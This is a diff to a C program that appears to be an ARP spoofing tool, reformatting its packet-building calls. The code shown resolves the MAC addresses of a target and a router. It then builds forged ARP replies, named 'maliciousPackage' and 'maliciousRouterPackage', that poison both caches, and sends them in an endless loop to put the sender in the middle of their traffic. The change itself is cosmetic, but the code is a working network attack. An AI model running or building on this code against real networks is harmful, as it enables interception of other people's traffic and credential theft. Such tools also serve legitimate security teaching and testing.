@@ -82,8 +82,17 @@ int main(int argc, const char* argv[]) {
 	}
 		
 
-    	ArpPackage initialPackage = createArpPackage(ARPOP_REQUEST, localInterfaceMacAddress, localInterfaceIpAddress, broadcastMacAddress, targetIpAddress);
-    	ArpPackage routerInitialPackage = createArpPackage(ARPOP_REQUEST, localInterfaceMacAddress, localInterfaceIpAddress, broadcastMacAddress, routerIpAddress);
+    ArpPackage initialPackage = createArpPackage(ARPOP_REQUEST,
+                                                localInterfaceMacAddress,
+                                                localInterfaceIpAddress,
+                                                broadcastMacAddress,
+                                                targetIpAddress);
+    
+    ArpPackage routerInitialPackage = createArpPackage(ARPOP_REQUEST,
+                                                       localInterfaceMacAddress,
+                                                       localInterfaceIpAddress,
+                                                       broadcastMacAddress,
+                                                       routerIpAddress);
 	ArpPackage receivedPackage; 
 	
 	printf("Sending Initial Arp\n");
@@ -113,12 +122,19 @@ int main(int argc, const char* argv[]) {
 		printf("Error 5\n");
 		exit(EXIT_FAILURE);
 	}
-		
 	memcpy(routerMacAddress, receivedPackage.senderMacAddress, MAC_ADDRESS_LENGTH);
 			
-	ArpPackage maliciousPackage = createArpPackage(ARPOP_REPLY, localInterfaceMacAddress, routerIpAddress, targetMacAddress, targetIpAddress);
-	ArpPackage maliciousRouterPackage = createArpPackage(ARPOP_REPLY, localInterfaceMacAddress, targetIpAddress, routerMacAddress, routerIpAddress);
+	ArpPackage maliciousPackage = createArpPackage(ARPOP_REPLY,
+                                                   localInterfaceMacAddress,
+                                                   routerIpAddress,
+                                                   targetMacAddress,
+                                                   targetIpAddress);
+	ArpPackage maliciousRouterPackage = createArpPackage(ARPOP_REPLY,
+                                                         localInterfaceMacAddress,
+                                                         targetIpAddress,
+                                                         routerMacAddress, routerIpAddress);
 	
+    
 	// Continuosly send packages
 	while(1) {
 		if( sendArpPackage(&maliciousPackage) < 0) {
